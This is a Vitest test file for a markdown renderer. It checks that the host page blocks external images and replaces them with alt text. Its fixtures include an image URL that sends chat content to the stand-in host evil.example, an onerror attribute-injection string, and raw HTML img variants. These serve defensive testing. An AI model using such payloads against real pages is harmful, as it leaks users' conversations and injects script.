// @vitest-environment jsdom
// happy-dom 下 DOMPurify 不消毒（見 src/shared/ui/story-markdown.test.ts），這裡驗的是消毒後的圖片把關
import { describe, expect, it } from "vitest";
import { renderHostMarkdownAt } from "./host-markdown";

const ORIGIN = "https://play.example";
const render = (text: string) => renderHostMarkdownAt(text, ORIGIN);
const images = (html: string) => {
  const box = document.createElement("div");
  box.innerHTML = html;
  return [...box.querySelectorAll("img")].map((image) => image.getAttribute("src"));
};

describe("host page never loads external images", () => {
  it("replaces an exfiltrating image with its alt text and drops the URL", () => {
    const html = render("![photo](https://evil.example/?message=秘密對話)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
    expect(html).toContain('<span class="image-blocked">[photo]</span>');
  });

  it("keeps data: images and same-origin images", () => {
    expect(render("![a](data:image/png;base64,AAAA)")).toContain('<img src="data:image/png;base64,AAAA"');
    expect(render(`![b](${ORIGIN}/sample.png)`)).toContain(`<img src="${ORIGIN}/sample.png"`);
  });

  it("does not let an attribute-looking alt smuggle markup", () => {
    const html = render('![x" onerror="alert(1)](https://evil.example/a.png)');
    const box = document.createElement("div");
    box.innerHTML = html;
    expect(html).not.toContain("<img");
    expect(box.querySelectorAll("[onerror]")).toHaveLength(0);
    expect(box.textContent?.trim()).toBe('[x" onerror="alert(1)]');
  });

  // 原始 HTML 的 img：屬性順序任意、alt／title 可含 >，字串 regex 會截錯
  it("blocks raw HTML external images however the attributes are written", () => {
    const cases = [
      '<img alt="x>" src="https://evil.example/a.png">',
      '<img title="a>b" src="https://evil.example/a.png" alt="y">',
      '<img src="https://evil.example/a.png" alt="z">',
      '<img srcset="https://evil.example/a.png 1x" alt="s">',
      '<img src="" alt="e">',
      '<img alt="m">',
      '<img src="//evil.example/a.png" alt="p">',
    ];
    for (const raw of cases) {
      const html = render(raw);
      expect(images(html), raw).toEqual([]);
      expect(html, raw).not.toContain("evil.example");
      expect(html, raw).toContain("image-blocked");
    }
  });

  it("keeps a same-origin raw HTML image with odd attributes", () => {
    expect(images(render(`<img alt="x>" src="${ORIGIN}/a.png">`))).toEqual([`${ORIGIN}/a.png`]);
  });
});
